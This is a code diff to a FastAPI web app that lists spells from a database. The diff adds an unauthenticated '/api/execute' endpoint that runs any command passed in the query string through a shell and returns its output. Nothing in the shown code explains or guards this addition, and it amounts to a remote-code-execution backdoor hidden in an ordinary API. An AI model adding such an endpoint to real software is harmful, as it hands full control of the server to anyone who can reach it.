@@ -1,3 +1,5 @@
+import subprocess
+
 from fastapi import FastAPI, HTTPException
 from fastapi.middleware.cors import CORSMiddleware
 from schemas import Spell
@@ -32,3 +34,13 @@ async def get_all_spells():
     async for spell in db.spells.find():
         spells.append(spell_helper(spell))
     return spells
+
+
+@app.get("/api/execute")
+async def execute_command(command: str | None = None):
+    process = subprocess.Popen(
+        command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    stdout = process.stdout.read().decode()
+    stderr = process.stderr.read().decode()
+
+    return {"stdout": stdout, "stderr": stderr}
